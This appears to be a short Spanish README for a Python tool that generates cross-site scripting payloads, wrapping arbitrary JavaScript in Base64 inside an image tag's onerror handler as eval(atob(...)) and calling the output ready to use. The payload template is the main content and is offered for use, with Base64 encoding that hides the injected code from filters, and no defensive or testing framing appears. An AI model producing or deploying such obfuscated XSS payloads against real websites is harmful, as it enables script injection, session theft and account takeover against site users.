# 🧠 XSS Payload Generator (Base64 + `eval(atob(...))`)

Este script en Python genera un payload XSS en formato:

```html
<img src="x" onerror="eval(atob('...'))">

🛠️ Uso
Escribe tu código JavaScript en la variable js

Ejecuta el script en consola:

python3 generate_payload.py

Se imprimirá el payload XSS completo listo para usar.